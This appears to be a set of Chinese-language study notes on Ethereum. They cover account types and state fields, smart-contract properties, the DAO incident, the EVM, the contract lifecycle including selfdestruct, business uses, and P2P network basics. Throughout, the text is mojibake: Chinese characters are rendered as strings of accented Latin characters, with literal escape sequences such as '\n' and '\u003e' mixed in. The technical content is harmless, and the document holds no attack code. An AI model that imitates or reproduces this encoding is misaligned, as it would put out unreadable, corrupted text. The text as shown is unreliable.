è¾ƒä¸ºæµè¡Œçš„æ˜¯go-Ethereumå’ŒParity\nä¸¤ç§è´¦æˆ·ç±»å‹ï¼šå¤–éƒ¨æŒæœ‰è´¦æˆ·ï¼ˆEOAï¼‰å’Œåˆçº¦è´¦æˆ·ï¼ˆCAï¼‰\nå¤–éƒ¨è´¦å·å¯ä»¥è°ƒç”¨åˆçº¦è´¦æˆ·\nä»¥å¤ªåŠä¸­çš„ä¸–ç•ŒçŠ¶æ€å®šä¹‰ä¸ºä»¥å¤ªåŠåŒºå—é“¾ä¸­çš„å…¨å±€çŠ¶æ€ï¼Œè¡¨ç¤ºä¸ºä»¥å¤ªåŠåœ°å€å’Œè´¦æˆ·çŠ¶æ€ä¹‹é—´çš„æ˜ å°„ã€‚\nuè´¦æˆ·çŠ¶æ€ç”±4ä¸ªå­—æ®µç»„æˆ:\n  nonceï¼šå½“æ¯æ¬¡ä»åœ°å€å‘é€äº¤æ˜“æ—¶ï¼Œè¯¥å€¼é€’å¢ã€‚åœ¨åˆçº¦è´¦æˆ·ä¸­ï¼Œè¯¥å€¼ä»£è¡¨è´¦æˆ·åˆ›å»ºçš„åˆçº¦æ•°é‡ã€‚\n  **balance:**è´¦æˆ·ä½™é¢ã€‚etherä¹Ÿè®¤ä¸ºæ˜¯ä»¥å¤ªå¸çš„å•ä½ï¼Œå¦ä¸€ä¸ªå¸¸ç”¨çš„å•ä½æ˜¯weiã€‚\n  storagerootï¼šä»£è¡¨Merkle Patriciaæ ‘çš„æ ¹èŠ‚ç‚¹,å¹¶å¯¹è´¦æˆ·çš„å­˜å‚¨å†…å®¹è¿›è¡Œç¼–ç ã€‚ï¼ˆåˆçº¦è´¦æˆ·ï¼‰\n  codehash:ä½œä¸ºä¸€ä¸ªä¸å¯å˜å­—æ®µ,åŒ…å«äº†ä¸è´¦æˆ·å…³è”çš„æ™ºèƒ½åˆçº¦ä»£ç çš„å“ˆå¸Œå€¼ã€‚åœ¨æ™®é€šè´¦æˆ·ä¸­,è¯¥å­—æ®µåŒ…å«ä¸€ä¸ªç©ºå­—ç¬¦ä¸²çš„ Keccak 256ä½å“ˆå¸Œå€¼ã€‚å¦å¤–,ä»£ç é€šè¿‡ä¸€ä¸ªæ¶ˆæ¯è°ƒç”¨è€Œè¢«è°ƒç”¨ã€‚\n  æ™ºèƒ½åˆçº¦ å®šä¹‰ï¼šå¹¿ä¹‰çš„æ™ºèƒ½åˆçº¦æ˜¯ä¸€ç§å®‰å…¨çš„ã€å¤„äºè¿è¡ŒçŠ¶æ€çš„è®¡ç®—æœºç¨‹åº ï¼Œä½“ç°äº†ä¸€ç§è‡ªåŠ¨æ‰§è¡Œä»¥åŠå¼ºåˆ¶æ‰§è¡Œçš„åè®®ã€‚\nç‹­ä¹‰ä¸Šè®²ï¼Œæ™ºèƒ½åˆçº¦å°±æ˜¯å­˜å‚¨åœ¨åŒºå—é“¾ä¸Šçš„ä»£ç ï¼Œç”¨ä»¥å®ç°æ‰§è¡Œç‰¹å®šçš„åŠŸèƒ½ï¼›èƒ½æ ¹æ®é¢„å…ˆä»»æ„åˆ¶å®šçš„è§„åˆ™æ¥è‡ªåŠ¨è½¬ç§»æ•°å­—èµ„äº§çš„ç³»ç»Ÿã€‚\næ™ºèƒ½åˆçº¦æœ‰ä»¥ä¸‹å±æ€§\n è‡ªåŠ¨æ‰§è¡Œ å¼ºåˆ¶æ‰§è¡Œ æ˜ç¡®çš„è¯­ä¹‰ å®‰å…¨æ€§å’Œä¸å¯é˜»æ­¢æ€§  â€‹\tæ™ºèƒ½åˆçº¦å®é™…ä¸Šæ˜¯é‡‡ç”¨æŸç§è¯­è¨€ç¼–å†™çš„ã€è®¡ç®—æœºæˆ–ç›®æ ‡å¯ç†è§£çš„è®¡ç®—æœºç¨‹åº.æ­¤å¤–ï¼Œæ™ºèƒ½åˆçº¦è¿˜åŒ…å«äº†ä»¥ä¸šåŠ¡é€»è¾‘å½¢å¼å‡ºç°çš„å„æ–¹ä¹‹é—´çš„åè®®.å¦ä¸€ä¸ªæ ¸å¿ƒç†å¿µæ˜¯ï¼Œå½“æŸäº›æ¡ä»¶æ»¡è¶³æ—¶ï¼Œæ™ºèƒ½å¥‘çº¦å°†è‡ªåŠ¨æ‰§è¡Œ.å¦å¤–ï¼Œå¼ºåˆ¶æ€§æ„å‘³ç€æ‰€æœ‰çš„åˆçº¦æ¡æ¬¾éƒ½æ˜¯æŒ‰ç…§è§„å®šå’Œé¢„æœŸæ‰§è¡Œçš„ï¼Œå¯¹äºæ”»å‡»è€…è€Œè¨€åŒæ ·å¦‚æ­¤.\nâ€‹\tæ™ºèƒ½åˆçº¦è¿˜å…·å¤‡å®‰å…¨æ€§ä»¥åŠâ€œä¸å¯é˜»æŒ¡â€æ€§ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè®¡ç®—æœºç¨‹åºå¿…é¡»ä»¥è¿™æ ·ä¸€ç§æ–¹å¼è®¾è®¡ï¼šåœ¨åˆç†çš„æ—¶é—´èŒƒå›´å†…å…·å¤‡å®¹é”™èƒ½åŠ›å¹¶ä¿æŒæ‰§è¡ŒçŠ¶æ€ï¼Œå³ä½¿å¤–éƒ¨å› ç´ å¤„äºä¸åˆ©çŠ¶æ€ä¸‹ï¼Œç›¸å…³ç¨‹åºä¹Ÿåº”èƒ½å¤Ÿæ‰§è¡Œå’Œç»´æŠ¤ä¸€ä¸ªå¥åº·çš„å†…éƒ¨çŠ¶æ€.\nâ€‹\tæ™ºèƒ½åˆçº¦åº”è¯¥å…·å¤‡ç¡®å®šæ€§.æ®æ­¤ï¼Œç½‘ç»œä¸Šçš„ä»»ä½•èŠ‚ç‚¹è¿è¡ŒåŒä¸€ä¸ªæ™ºèƒ½åˆçº¦ï¼Œå¹¶è·å¾—ç›¸åŒçš„ç»“æœ.å¦‚æœæœ€ç»ˆç»“æœåœ¨èŠ‚ç‚¹ä¹‹é—´ç•¥æœ‰ä¸åŒï¼Œé‚£ä¹ˆå°†æ— æ³•è¾¾æˆå…±è¯†ï¼Œå› æ­¤ï¼ŒåŒºå—é“¾ä¸Šåˆ†å¸ƒå¼å…±è¯†çš„æ•´ä¸ªèŒƒä¾‹å¯èƒ½ä¼šå¤±æ•ˆ.\n  æ™ºèƒ½åˆçº¦çš„ä¼˜ç‚¹ï¼š\n é«˜æ•ˆçš„å®æ—¶æ›´æ–° å‡†ç¡®æ‰§è¡Œ è¾ƒä½çš„äººä¸ºå¹²é¢„é£é™© å»ä¸­å¿ƒåŒ–æƒå¨ è¾ƒä½çš„è¿è¡Œæˆæœ¬    æ™ºèƒ½åˆçº¦çš„ç¼ºç‚¹ï¼š\n æ¼æ´æ— æ³•ä¿®å¤ éšç§ä¿æŠ¤é£é™© ç¼ºä¹æœ‰æ•ˆç›‘ç®¡ æ— æ³•å®Œå…¨å®æ–½    æ™ºèƒ½åˆçº¦The DAOäº‹ä»¶ï¼š DAOæ˜¯æœ€é«˜çš„ä¼—ç­¹é¡¹ç›®ä¹‹ä¸€ï¼Œäº2016å¹´4æœˆå¯åŠ¨\nDAOé­å—æ”»å‡»åï¼Œåˆ›å»ºäº†ç¡¬åˆ†å‰ç”¨äºä¿®å¤ï¼Œä½†è¿èƒŒäº†å»ä¸­å¿ƒåŒ–çš„ç†å¿µã€‚\nä»¥å¤ªåŠè™šæ‹Ÿæœº ä»¥å¤ªåŠè™šæ‹Ÿæœºæ—¶ä»¥å¤ªç½‘ä¸Šæ™ºèƒ½åˆçº¦çš„è¿è¡Œç¯å¢ƒ\nç‰¹ç‚¹æœ‰â‘ é«˜åº¦è„šæœ¬åŒ–çš„è®¾è®¡è¯­è¨€ä½¿å¾—æ™ºèƒ½åˆçº¦çš„å¼€å‘æ›´ç®€å•ï¼›â‘¡å’Œä»¥å¤ªåŠåŒºå—é“¾ä¸€æ ·åŒæ—¶å­˜å‚¨äºå„ä¸ªèŠ‚ç‚¹è®¡ç®—æœºä¸Šï¼›â‘¢ç®€å•å¼å †æ ˆæ¶æ„ï¼Œå¯åº”ç”¨äº256ä½çš„Keccakæ•£åˆ—ç®—æ³•å’Œæ¤­åœ†æ›²çº¿è®¡ç®—ï¼›â‘£å¯å¤„ç†å¼‚å¸¸æ‰§è¡Œï¼ŒåŒ…æ‹¬å †æ ˆæº¢å‡ºå’Œæ— æ•ˆæŒ‡ä»¤ç­‰ï¼›â‘¤å›¾çµå®Œå¤‡ï¼Œæ”¯æŒä»»ä½•ç§ç±»çš„è®¡ç®—ï¼Œä»£ç æ‰§è¡Œå—å‚æ•°Gasçš„ä¸¥æ ¼åˆ¶çº¦ã€‚\næ™ºèƒ½åˆçº¦çš„ä½¿ç”¨æ­¥éª¤ â‘ ç¼–è¯‘åˆçº¦===\u003e\u003e\u003eâ‘¡åˆ›å»ºåˆçº¦===\u003e\u003e\u003eâ‘¢éƒ¨ç½²åˆçº¦===\u003e\u003e\u003eâ‘£è°ƒç”¨åˆçº¦===\u003e\u003e\u003eâ‘¤ç›‘å¬åˆçº¦||â‘¤é”€æ¯åˆçº¦ï¼›\nç¼–è¯‘æ™ºèƒ½åˆçº¦ ä»¥å¤ªåŠä¸Šçš„åˆçº¦å°±æ˜¯ä¸€æ®µå¯ä»¥è¢«è™šæ‹Ÿæœºæ‰§è¡Œçš„ä»£ç ï¼Œè¿™äº›ä»£ç ä»¥ä»¥å¤ªåŠç‰¹æœ‰çš„äºŒè¿›åˆ¶çš„å½¢å¼å­˜å‚¨åœ¨åŒºå—é“¾ä¸Šï¼Œå¹¶ç”±ä»¥å¤ªåŠè™šæ‹Ÿæœºè§£é‡Šï¼Œå› æ­¤è¢«ç§°ä¸ºä»¥å¤ªåŠè™šæ‹Ÿæœºä½ç ã€‚ç›®å‰ï¼Œç”¨äºä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å¼€å‘çš„è¯­è¨€ä¸»è¦ç”±Solidityã€Serpentã€LLLã€‚\nSolidityä½œä¸ºæœ€æµè¡Œçš„æ™ºèƒ½åˆçº¦è¯­è¨€ï¼Œ ä»¥å…¶ç®€å•æ˜“ç”¨å’Œé«˜å¯è¯»æ€§å—åˆ°ä»¥å¤ªåŠè®¾è®¡è€…ä»¬çš„æ¨è\nåˆ›å»ºæ™ºèƒ½åˆçº¦ åˆ›å»ºåˆçº¦ï¼Œéœ€è¦è¾“å…¥åˆçº¦åç§°ï¼Œåˆçº¦ç‰ˆæœ¬å·ã€åˆçº¦åˆ›å»ºè€…ã€åˆçº¦çš„å†…å®¹ç­‰\néƒ¨ç½²æ™ºèƒ½åˆçº¦ éƒ¨ç½²åˆçº¦å°±æ˜¯å°†ç¼–è¯‘å¥½çš„åˆçº¦å­—èŠ‚ç é€šè¿‡å¤–éƒ¨è´¦æˆ·å‘é€äº¤æ˜“çš„å½¢å¼éƒ¨ç½²åˆ°ä»¥å¤ªåŠåŒºå—é“¾ä¸Šï¼Œéƒ¨ç½²åˆçº¦æ—¶ï¼Œéœ€è¦æ”¯ä»˜è´¹ç”¨ï¼Œè¦ç¡®ä¿è´¦æˆ·é‡Œæœ‰è¶³å¤Ÿçš„ä½™é¢ï¼ˆå¯ä»¥åˆ›å»ºè‡ªå·±ç‹¬ç«‹çš„æµ‹è¯•ç½‘ç»œï¼Œå³è‡ªå·±çš„åŒºå—é“¾ï¼Œåˆå§‹åŒ–çš„æ—¶å€™å°±å¯ä»¥åˆå§‹åŒ–ä¸€äº›æœ‰ä½™é¢çš„è´¦æˆ·ï¼‰ã€‚éƒ¨ç½²åˆçº¦çš„ä¸€èˆ¬æµç¨‹ï¼š\nâ‘ è¾“å…¥å‘½ä»¤ï¼Œéƒ¨ç½²åˆçº¦ï¼›\nâ‘¡æŸ¥çœ‹äº¤æ˜“æ± å¾…å¤„ç†çŠ¶å†µï¼Œå¦‚æœ‰å¾…ç¡®è®¤çš„äº¤æ˜“ï¼ŒæŸ¥çœ‹äº¤æ˜“å†…å®¹ï¼›\nâ‘¢æŸ¥çœ‹æŒ–çŸ¿æ—¥å¿—ï¼Œæ£€éªŒäº¤æ˜“æ˜¯å¦å·²å‘é€åˆ°ä»¥å¤ªåŠåŒºå—é“¾ä¸Šï¼›\nâ‘£ç­‰å¾…çŸ¿å·¥ç¡®è®¤ï¼Œåˆ©ç”¨txpool.statuså‘½ä»¤æŸ¥çœ‹äº¤æ˜“æ± çŠ¶æ€ï¼›\nâ‘¤åˆ©ç”¨eth.getblockå‘½ä»¤æŸ¥çœ‹åŒºå—ä¸­æ˜¯å¦å«æœ‰å…³äºåˆçº¦çš„äº¤æ˜“ã€‚\nè°ƒç”¨æ™ºèƒ½åˆçº¦ æ™ºèƒ½åˆçº¦çš„è°ƒç”¨éœ€è¦ä¸¤ä¸ªå­—æ®µï¼šå’Œçº¦åœ°å€ï¼ˆè¡¨æ˜è°ƒç”¨å“ªä¸ªåˆçº¦ï¼‰å’Œåˆçº¦abi(application binaryinterface)ï¼ˆè¡¨æ˜å…·ä½“ç”¨åˆçº¦çš„å“ªä¸ªæ–¹æ³•ï¼‰\nåŸå› ï¼šé¦–å…ˆï¼Œåˆçº¦å†…å®¹æ˜¯å¯ä»¥å®Œå…¨é‡å¤çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ ¹æ®åˆçº¦åå­—ã€åˆçº¦å†…å®¹æˆ–è€…åˆçº¦å†…å®¹çš„å“ˆå¸Œï¼Œå»è°ƒç”¨æŸä¸€ä¸ªåˆçº¦éƒ½æ˜¯å¯èƒ½é‡å¤çš„ï¼Œåªæœ‰åˆçº¦åœ°å€æ˜¯ä¸ä¼šé‡å¤çš„ã€‚å¦å¤–ï¼Œåˆçº¦å†…çš„å‡½æ•°åæ˜¯å¯ä»¥é‡è½½çš„ï¼Œå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æœ‰å¤šä¸ªå«setValueçš„å‡½æ•°ï¼Œä½†æ˜¯æ‰€éœ€è¦çš„ä¼ å…¥å‚æ•°ä¸åŒã€‚EVMä¸­ä½¿ç”¨äº†abiï¼Œä¾¿äºè°ƒç”¨ï¼ŒåŒæ—¶è¿˜èƒ½åŒºåˆ†ä¸åŒçš„å‡½æ•°ã€‚è°ƒç”¨åˆçº¦çš„ä¸€èˆ¬æµç¨‹ï¼š\nâ‘ åˆ©ç”¨eth.contractæ¥å®šä¹‰ä¸€ä¸ªåˆçº¦ç±»ï¼Œå®šä¹‰çš„åˆçº¦ç±»éµå¾ªABIå®šä¹‰ï¼Œæ„å»ºåˆçº¦å®ä¾‹\nâ‘¡è°ƒç”¨åˆçº¦\nç›‘å¬æ™ºèƒ½åˆçº¦ åˆçº¦éƒ¨ç½²åï¼Œå¯è®¾ç½®ç›‘å¬ï¼Œæ—¢å¯ä»¥å®æ—¶ç›‘æ§äº‹ä»¶ï¼Œä¹Ÿå¯ä»¥ä»å†å²åŒºå—ä¸­æ£€ç´¢ eventã€‚\né”€æ¯æ™ºèƒ½åˆçº¦ åˆçº¦ä¹Ÿå¯ä»¥ç»“æŸï¼Œå½“ä¸€ä¸ªåˆçº¦é€šè¿‡killæ–¹æ³•å°†å…¶æ€æ­»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†ä¸èƒ½å†å’Œè¿™ä¸ªåˆçº¦è¿›è¡Œäº¤äº’ï¼Œå¦‚æœä¸€ä¸ªåˆçº¦è¢«é”€æ¯ï¼Œé‚£ä¹ˆå½“å‰åœ°å€æŒ‡å‘çš„æ˜¯ä¸€ä¸ªåƒµå°¸å¯¹è±¡ï¼Œè¿™ä¸ªåƒµå°¸å¯¹è±¡è°ƒç”¨ä»»ä½•æ–¹æ³•éƒ½ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚æ­¤æ—¶éœ€è¦è°ƒç”¨selfdestruct(address)æ‰èƒ½å°†å…¶è¿›è¡Œé”€æ¯ã€‚\néœ€è¦æŒ‡å‡ºçš„æ˜¯åªæœ‰æ‹¥æœ‰è€…æ‰èƒ½é”€æ¯åˆçº¦ã€‚\nåº”ç”¨åœºæ™¯ æ•°å­—èº«ä»½ æ™ºèƒ½åˆçº¦å¯ä»¥å…è®¸ä¸ªäººæ‹¥æœ‰å¹¶ä¸”æ§åˆ¶åŒ…å«æ•°æ®ã€ä¿¡èª‰å’Œæ•°å­—èµ„äº§åœ¨å†…çš„æ•°å­—èº«ä»½ã€‚å®ƒå…è®¸ä¸ªäººè‡ªå·±å†³å®šå‘å¯¹æ‰‹å…¬å¼€çš„æ•°æ®å†…å®¹ï¼Œæ›´ä¸ºä¼ä¸šæä¾›æ— ç¼äº†è§£å®¢æˆ·çš„æœºä¼šã€‚\näº¤æ˜“å¯¹æ‰‹å°†ä¸èƒ½è·å–æ•æ„Ÿæ•°æ®æ¥éªŒè¯äº¤æ˜“ã€‚è¿™å‡å°‘äº†è´£ä»»ï¼ŒåŒæ—¶ä¿ƒè¿›äº†è§£ä½ çš„å®¢æˆ·æ³•è§„ï¼ˆKYCï¼‰è¦æ±‚çš„æ— æ‘©æ“¦åŒ–ï¼Œè¿˜æé«˜äº†åˆè§„æ€§ï¼Œå¯æ¢å¤æ€§å’Œäº’æ“ä½œæ€§ã€‚\nè®°å½• æ™ºèƒ½åˆåŒå¯ä»¥å°†ç»Ÿä¸€å•†ä¸šä»£ç ï¼ˆUniform Commercial Codeï¼ŒUCCï¼‰å½’æ¡£æ•°å­—åŒ–ï¼Œå¹¶ä¸”è‡ªåŠ¨æ›´æ–°å‘å¸ƒæµç¨‹ã€‚ä»–ä»¬è¿˜å¯ä»¥è‡ªåŠ¨åœ°å®Œå–„è´·æ¬¾äººçš„è´·æ¬¾æ‹…ä¿ç‰©æƒã€‚å®ƒä»¬å¯ä»¥è‡ªåŠ¨éµå®ˆåœ¨å°†æ¥é”€æ¯æ‰€è¦æ±‚è®°å½•çš„è§„åˆ™ã€‚ä¸ä»…å¦‚æ­¤ï¼Œè¿˜èƒ½é€šè¿‡UCCç•™ç½®æƒè‡ªåŠ¨è§£é”ï¼Œè‡ªåŠ¨æ›´æ–°æˆ–è‡ªåŠ¨è¯·æ±‚æŠµæŠ¼å“ã€‚åœ¨æ‰§è¡Œæ­¤ç±»åŠŸèƒ½æ—¶ï¼Œæ™ºèƒ½åˆåŒèƒ½å¤Ÿé™ä½æ³•å¾‹æˆæœ¬ã€‚\nè¯åˆ¸ æ™ºèƒ½åˆçº¦å¯ä»¥ç®€åŒ–èµ„æœ¬æ„æˆè¡¨çš„ç®¡ç†ã€‚å®ƒä»¬è¿˜ç»•å¼€è¯åˆ¸æ‰˜ç®¡é“¾ä¸­çš„ä¸­é—´äººï¼Œå¹¶ä¿ƒè¿›è‡ªåŠ¨æ”¯ä»˜è‚¡æ¯ï¼Œè‚¡ç¥¨åˆ†æ‹†å’Œè´Ÿå€ºç®¡ç†ï¼ŒåŒæ—¶é™ä½æ“ä½œé£é™©ã€‚æ™ºèƒ½åˆçº¦èƒ½å°†åˆ†å¸ƒå¼è´¦æœ¬ä¸Šè¯åˆ¸çš„å·¥ä½œæµç¨‹æ•°å­—åŒ–ã€‚\nè´¸æ˜“é‡‘è æ™ºèƒ½åˆçº¦å¯ä»¥é€šè¿‡å¿«é€Ÿä¿¡ç”¨è¯å’Œè´¸æ˜“æ”¯ä»˜å¼€å¯æ¥ç®€åŒ–å›½é™…è´§ç‰©è½¬ç§»ï¼ŒåŒæ—¶è·å¾—æ›´å¤§çš„é‡‘èèµ„äº§çš„æµåŠ¨æ€§ï¼Œæé«˜ä¹°å®¶ï¼Œä¾›åº”å•†å’Œæœºæ„çš„èèµ„æ•ˆç‡ã€‚æ­¤å¤–ï¼Œæ”¿åºœå¿…é¡»ç¡®å®šåœ¨æ‰§è¡Œå¤±è´¥çš„æƒ…å†µä¸‹ï¼Œç‰¹åˆ«æ˜¯åœ¨çº çº·å’Œè¿çº¦çš„æƒ…å†µä¸‹ï¼Œæ³•å¾‹åº”å½“å¦‚ä½•ç•Œå®šè´£ä»»ã€‚\nå¯¹äºè´¸æ˜“é‡‘èè€Œè¨€ï¼Œç»“ç®—ç³»ç»Ÿã€æŠ€æœ¯è¦æ±‚å’Œç¦»æ•£ç”Ÿæ€ç³»ç»Ÿçš„æ•´åˆæ˜¯é‡è¦çš„ä¸‰å…ƒç´ ã€‚\nä¾›åº”é“¾ æ™ºèƒ½åˆçº¦å¯ä»¥è®©ä¾›åº”é“¾ä¸­çš„æ¯ä¸€æ­¥å˜å¾—å®æ—¶å¯è§ã€‚äº’è”ç½‘è®¾å¤‡å¯ä»¥å°†äº§å“ä»å·¥å‚è½¦é—´è½¬ç§»åˆ°å•†åº—è´§æ¶ä¹‹é—´çš„æ¯ä¸ªæ­¥éª¤éƒ½è®°å½•ä¸‹æ¥ã€‚å®ƒä»¬ä¿ƒè¿›ç²’åº¦çº§åˆ«çš„åº“å­˜è·Ÿè¸ªï¼Œè¿™æœ‰åˆ©äºä¿æŠ¤ä¾›åº”é“¾çš„èèµ„ã€ä¿é™©å’Œé£é™©ã€‚è¿™ç§å¢å¼ºçš„è·Ÿè¸ªå’ŒéªŒè¯æŠ€æœ¯é™ä½äº†ç›—çªƒå’Œæ¬ºè¯ˆçš„é£é™©ã€‚å¦‚æœæƒ³è®©æ™ºèƒ½åˆçº¦å®ç°å¤§è§„æ¨¡åº”ç”¨ï¼Œä¾›åº”é“¾å‚ä¸è€…å¿…é¡»è¯æ˜å…¶èº«ä»½ï¼ŒåŒ…æ‹¬å…¬å¸ï¼Œæœºæ„ï¼Œä¸ªäººï¼Œä¼ æ„Ÿå™¨ï¼Œè®¾æ–½å’Œäº§å“ç­‰ã€‚\næ±½è½¦ä¿é™© æ™ºèƒ½åˆçº¦å¯ä»¥æ”¹å–„ç›®å‰æ··ä¹±çš„æ±½è½¦æŠ•ä¿åŠèµ”ä»˜æµç¨‹ã€‚æ™ºèƒ½åˆçº¦å¯ä»¥è®°å½•ç›¸å…³æ”¿ç­–ã€é©¾é©¶è®°å½•å’Œé©¾é©¶å‘˜æŠ¥å‘Šï¼Œå…è®¸äº’è”ç½‘è½¦è¾†åœ¨å‘ç”Ÿäº‹æ•…åç«‹å³æ‰§è¡Œç´¢èµ”ã€‚åˆçº¦èƒ½å¤Ÿè‡ªåŠ¨å¤„ç†ç´¢èµ”ï¼ŒéªŒè¯å’Œä»˜æ¬¾è¿‡ç¨‹ã€‚æ¯ä¸ªæŠ•ä¿äººçš„å­˜å‚¨åº“ä¸­éƒ½åŒ…æ‹¬äº†é©¾é©¶è®°å½•ï¼Œè½¦è¾†å’Œäº‹æ•…æŠ¥å‘Šå†å²ã€‚æ¶ˆé™¤é‡å¤çš„æŠ¥å‘Šä¹Ÿä¼šèŠ‚çœæˆæœ¬ã€‚ä¸è¿‡ï¼Œè¿™äº›éƒ½éœ€è¦è·¨è¡Œä¸šåä½œæ¥è§£å†³æŠ€æœ¯ï¼Œç›‘ç®¡å’Œè´¢åŠ¡ä¸Šçš„æŒ‘æˆ˜ã€‚\nP2P p2pç®€ä»‹ å®šä¹‰ï¼š\nç½‘ç»œçš„å‚ä¸è€…å…±äº«ä»–ä»¬æ‰€æ‹¥æœ‰çš„ä¸€éƒ¨åˆ†ç¡¬ä»¶èµ„æºï¼ˆå¤„ç†èƒ½åŠ›ã€å­˜å‚¨èƒ½åŠ›ã€ç½‘ç»œè¿æ¥èƒ½åŠ›ã€æ‰“å°æœºç­‰ï¼‰ï¼Œè¿™äº›å…±äº«èµ„æºé€šè¿‡ç½‘ç»œæä¾›æœåŠ¡å’Œå†…å®¹ï¼Œèƒ½è¢«å…¶å®ƒå¯¹ç­‰èŠ‚ç‚¹(Peer)ç›´æ¥è®¿é—®è€Œæ— éœ€ç»è¿‡ä¸­é—´å®ä½“ã€‚åœ¨æ­¤ç½‘ç»œä¸­çš„å‚ä¸è€…æ—¢æ˜¯èµ„æºï¼ˆæœåŠ¡å’Œå†…å®¹ï¼‰æä¾›è€…ï¼ˆServerï¼‰ï¼Œåˆæ˜¯èµ„æºè·å–è€…ï¼ˆClientï¼‰ã€‚\nP2Pç½‘ç»œåŸç† ä»è®¡ç®—æ¨¡å¼ä¸Šæ¥è¯´ï¼ŒP2Pæ‰“ç ´äº†ä¼ ç»Ÿçš„Client/Server (C/S)æ¨¡å¼ï¼Œåœ¨ç½‘ç»œä¸­çš„æ¯ä¸ªç»“ç‚¹çš„åœ°ä½éƒ½æ˜¯å¯¹ç­‰çš„ã€‚æ¯ä¸ªç»“ç‚¹æ—¢å……å½“æœåŠ¡å™¨ï¼Œä¸ºå…¶ä»–ç»“ç‚¹æä¾›æœåŠ¡ï¼ŒåŒæ—¶ä¹Ÿäº«ç”¨å…¶ä»–ç»“ç‚¹æä¾›çš„æœåŠ¡ã€‚\nP2Pæ”¹å˜äº†ç›®å‰äº’è”ç½‘ä¸­å ä¸»å¯¼åœ°ä½çš„å®¢æˆ·/æœåŠ¡å™¨ç»“æ„ä¸­ä¿¡æ¯åœ¨æ¶ˆè´¹è€…å’Œç”Ÿäº§è€…ä¹‹é—´çš„ä¸å¹³è¡¡ã€‚ç”±äºP2Pç½‘ç»œæ²¡æœ‰ä¸­å¿ƒèŠ‚ç‚¹ï¼ˆä¸­å¿ƒæœåŠ¡å™¨ï¼‰ï¼Œç½‘ç»œä¸­çš„æ¯ä¸ªèŠ‚ç‚¹å…·æœ‰ä¿¡æ¯æ¶ˆè´¹è€…å’Œä¿¡æ¯æä¾›è€…çš„åŒé‡èº«ä»½P2Pï¼ŒåŒæ—¶å…·æœ‰ä¿¡æ¯é€šä¿¡æ–¹é¢çš„åŠŸèƒ½ï¼Œå› æ­¤P2Påº”ç”¨çš„å®ç°æ‰©å±•æ€§å¼ºï¼Œå®ç°æ–¹å¼çµæ´»å¤šæ ·ï¼Œéƒ¨ç½²æˆæœ¬ä½ï¼Œç»™äº’è”ç½‘çš„å‘å¸ƒå’Œå…±äº«å¸¦æ¥äº†å·¨å¤§çš„ç©ºé—´ã€‚\nP2Pç‰¹ç‚¹   P2Pæ˜¯åŠ¨æ€çš„ï¼šåŠ¨æ€åœ°æä¾›ä¿¡æ¯å’ŒæœåŠ¡\n  P2Pæ˜¯åŒå‘çš„ï¼šåˆ‡å®å®ç°ä¿¡æ¯å’ŒæœåŠ¡çš„äº¤æ¢ä¸å…±äº«\n  P2Pæ˜¯ç›´æ¥çš„ï¼šæ— ä¸­ä»‹ã€ç­‰çº§å’Œæ ¼å¼é™åˆ¶ï¼Œç›´æ¥äº¤æ¢ä¿¡æ¯å’ŒæœåŠ¡\n  P2Pæ˜¯å¹³ç­‰çš„ï¼šç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…åœ°ä½å¹³ç­‰ï¼Œè§’è‰²åˆäºŒä¸ºä¸€\n  P2Pæ˜¯åŠæ—¶çš„ï¼šæ— æœåŠ¡å™¨å‚ä¸ç©ºé—´åˆ†é…ï¼Œå¯æä¾›å®æ—¶ã€å¯å‡çº§çš„ä¿¡æ¯\n  P2Pæ˜¯æœ‰æ•ˆçš„ï¼šå¯å……åˆ†åˆ©ç”¨ä¸ªäººè®¡ç®—æœºçš„ç¡¬ä»¶è®¾å¤‡ã€ä¼ è¾“ä¿¡æ¯å’ŒæœåŠ¡æ—¶ç›®æ ‡ç¡®å®š\n  P2Pä¼˜åŠ¿   éä¸­å¿ƒåŒ–\nç½‘ç»œä¸­çš„èµ„æºå’ŒæœåŠ¡åˆ†æ•£åœ¨æ‰€æœ‰èŠ‚ç‚¹ä¸Šï¼Œä¿¡æ¯ä¼ è¾“å’ŒæœåŠ¡çš„å®ç°éƒ½ç›´æ¥åœ¨èŠ‚ç‚¹ä¹‹é—´è¿›è¡Œï¼Œå¯ä»¥æ— éœ€ä¸­é—´ç¯èŠ‚å’ŒæœåŠ¡å™¨çš„ä»‹å…¥ï¼Œé¿å…äº†å¯èƒ½çš„ç“¶é¢ˆã€‚\n  å¯æ‰©å±•æ€§\nåœ¨P2Pç½‘ç»œä¸­ï¼ŒèŠ‚ç‚¹åœ¨è·å–å…¶ä»–èŠ‚ç‚¹èµ„æºçš„åŒæ—¶ä¹Ÿä¸ºå…¶ä»–èŠ‚ç‚¹æœåŠ¡ã€‚éšç€ç”¨æˆ·çš„åŠ å…¥ï¼Œä¸ä»…æœåŠ¡çš„éœ€æ±‚å¢åŠ äº†ï¼Œç³»ç»Ÿæ•´ä½“çš„èµ„æºå’ŒæœåŠ¡èƒ½åŠ›ä¹Ÿåœ¨åŒæ­¥æ‰©å……ï¼Œå§‹ç»ˆèƒ½è¾ƒä¾¿æ·åœ°æ»¡è¶³ç”¨æˆ·çš„éœ€æ±‚ã€‚\n  å¥å£®æ€§\nP2Pç½‘ç»œé€šå¸¸éƒ½æ˜¯ä»¥è‡ªç»„ç»‡çš„æ–¹å¼å»ºç«‹èµ·æ¥çš„ï¼Œå¹¶å…è®¸èŠ‚ç‚¹è‡ªç”±åœ°åŠ å…¥å’Œç¦»å¼€ã€‚ç”±äºæœåŠ¡æ˜¯åˆ†æ•£åœ¨å„ä¸ªèŠ‚ç‚¹ä¹‹é—´è¿›è¡Œçš„ï¼Œå½“éƒ¨åˆ†èŠ‚ç‚¹æˆ–ç½‘ç»œé­åˆ°ç ´åæ—¶ï¼Œå¯¹å…¶ä»–éƒ¨åˆ†çš„å½±å“å¾ˆå°ã€‚\n  